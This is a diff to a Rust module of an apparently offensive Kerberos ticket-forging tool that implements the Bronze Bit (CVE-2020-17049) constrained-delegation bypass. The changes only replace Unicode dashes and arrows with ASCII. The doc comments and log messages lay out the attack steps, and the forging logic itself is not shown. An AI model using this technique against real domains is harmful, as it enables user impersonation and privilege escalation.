@@ -1,9 +1,9 @@
-//! Bronze Bit (CVE-2020-17049) — S4U2Proxy forwardable flag bypass.
+//! Bronze Bit (CVE-2020-17049) -- S4U2Proxy forwardable flag bypass.
 //!
 //! Services configured with `TrustedToAuthForDelegation` (constrained delegation)
 //! can use S4U2Self to obtain a service ticket for any user, then use S4U2Proxy
 //! to forward that ticket to the target service. Normally, the user must NOT have
-//! the "Sensitive and cannot be delegated" flag — but Bronze Bit bypasses this.
+//! the "Sensitive and cannot be delegated" flag -- but Bronze Bit bypasses this.
 //!
 //! ## How It Works
 //!
@@ -20,7 +20,7 @@ use tracing::info;
 use crate::golden;
 use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
 
-/// Run the Bronze Bit attack — delegate a sensitive user via S4U2Proxy bypass.
+/// Run the Bronze Bit attack -- delegate a sensitive user via S4U2Proxy bypass.
 ///
 /// 1. Request TGT for the controlled user
 /// 2. S4U2Self to impersonate the target (even if "sensitive and cannot be delegated")
@@ -28,7 +28,7 @@ use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
 /// 4. Save the delegated service ticket
 pub async fn run_bronze_bit(config: &ForgeConfig, target_spn: &str) -> Result<ForgeResult> {
     info!(
-        "[bronzebit] Running Bronze Bit (CVE-2020-17049): {} → {}",
+        "[bronzebit] Running Bronze Bit (CVE-2020-17049): {} -> {}",
         config.effective_impersonate(),
         target_spn
     );
@@ -102,7 +102,7 @@ pub async fn run_bronze_bit(config: &ForgeConfig, target_spn: &str) -> Result<Fo
     );
 
     Ok(ForgeResult {
-        action: format!("Bronze Bit → {target_spn}"),
+        action: format!("Bronze Bit -> {target_spn}"),
         domain: config.domain.clone(),
         success: true,
         ticket_data: Some(ForgedTicket {
@@ -124,7 +124,7 @@ pub async fn run_bronze_bit(config: &ForgeConfig, target_spn: &str) -> Result<Fo
         }),
         persistence_result: None,
         message: format!(
-            "Bronze Bit (CVE-2020-17049) completed: delegated {impersonate} → {target_spn} ({etype_str}). \
+            "Bronze Bit (CVE-2020-17049) completed: delegated {impersonate} -> {target_spn} ({etype_str}). \
              Bypassed 'sensitive and cannot be delegated' restriction."
         ),
     })
